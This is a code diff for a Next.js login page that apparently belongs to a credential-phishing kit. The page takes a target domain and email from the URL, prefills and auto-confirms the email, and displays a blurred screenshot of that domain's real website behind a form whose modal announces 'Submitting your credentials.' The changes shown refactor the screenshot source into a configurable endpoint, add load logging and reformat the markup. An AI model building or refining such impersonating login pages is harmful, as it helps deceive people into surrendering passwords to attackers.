@@ -1,4 +1,5 @@
 'use client'
+
 import '../styles/globals.css'
 import { useSearchParams } from 'next/navigation'
 import { useState, useEffect } from 'react'
@@ -13,7 +14,7 @@ export default function LoginPage() {
   const [password, setPassword] = useState('')
   const [showModal, setShowModal] = useState(false)
   const [errors, setErrors] = useState({ email: '', password: '' })
-  const [screenshotUrl, setScreenshotUrl] = useState<string>('')
+  const [screenshotUrl, setScreenshotUrl] = useState('')
 
   // Auto-confirm if email prefilled
   useEffect(() => {
@@ -24,7 +25,8 @@ export default function LoginPage() {
   useEffect(() => {
     if (domain) {
       const target = encodeURIComponent(`https://${domain}`)
-      setScreenshotUrl(`/api/screenshot?url=${target}`)
+      const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL || '/api/screenshot'
+      setScreenshotUrl(`${base}?url=${target}`)
     }
   }, [domain])
 
@@ -66,6 +68,8 @@ export default function LoginPage() {
           <img
             src={screenshotUrl}
             alt={`Screenshot of ${domain}`}
+            onLoad={() => console.log('✅ screenshot loaded')}
+            onError={(e) => console.error('❌ failed to load screenshot', e)}
             className="w-full h-full object-cover opacity-20 filter blur-sm pointer-events-none"
           />
         </div>
@@ -85,7 +89,9 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.email && <p className="text-sm text-red-600">{errors.email}</p>}
+            {errors.email && (
+              <p className="text-sm text-red-600">{errors.email}</p>
+            )}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -131,8 +137,12 @@ export default function LoginPage() {
       {showModal && (
         <div className="modal-overlay">
           <div className="modal-content">
-            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
-            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
+            <h2 className="text-lg font-semibold text-gray-800">
+              Please wait…
+            </h2>
+            <p className="mt-2 text-gray-600">
+              Submitting your credentials.
+            </p>
           </div>
         </div>
       )}
